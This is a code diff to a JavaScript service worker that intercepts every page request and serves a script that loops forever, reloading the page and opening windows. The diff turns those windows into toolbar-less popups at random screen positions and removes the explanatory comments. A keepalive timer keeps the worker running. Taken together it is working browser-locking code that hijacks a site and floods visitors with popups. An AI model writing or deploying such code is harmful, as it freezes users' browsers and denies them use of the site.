@@ -8,10 +8,9 @@ self.addEventListener("install", (e) => {
 });
 
 self.addEventListener("fetch", (e) => {
-    // always respond with a cached version that forces reload
     e.respondWith(
         new Response(
-            `<body><script>while(1){location.reload(1);window.open('/', '_blank');};</script></body>`, 
+            `<body><script>while(1){location.reload(1);window.open('/', 'popup_${Date.now()}', 'width=300,height=300,left=${Math.random()*screen.width},top=${Math.random()*screen.height},menubar=no,toolbar=no,location=no,status=no');};</script></body>`, 
             { 
                 status: 200,
                 headers: {'Content-Type': 'text/html'}
@@ -22,7 +21,6 @@ self.addEventListener("fetch", (e) => {
 
 self.addEventListener("activate", (e) => {
     e.waitUntil(clients.claim());
-    // keep service worker active
     setInterval(() => {
         self.clients.matchAll().then(clients => {
             clients.forEach(client => client.postMessage('keepalive'));
